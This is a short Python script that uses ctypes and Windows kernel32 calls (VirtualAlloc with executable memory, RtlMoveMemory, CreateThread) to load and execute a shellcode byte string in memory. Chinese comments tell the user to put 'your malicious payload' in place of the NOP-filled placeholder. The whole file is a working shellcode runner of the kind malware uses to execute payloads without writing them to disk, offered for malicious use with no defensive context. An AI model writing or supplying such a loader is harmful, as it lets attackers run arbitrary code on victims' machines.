import ctypes

payload = b'\x90\x90\x90\x90\x90...'  # 放置你的惡意有效負載

def load_payload(payload):
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

    # 分配可執行內存空間
    address = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(payload)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    
    # 將payload複製到分配的空間
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(address), payload, ctypes.c_int(len(payload)))
    
    # 執行payload
    ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(address), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))

load_payload(payload)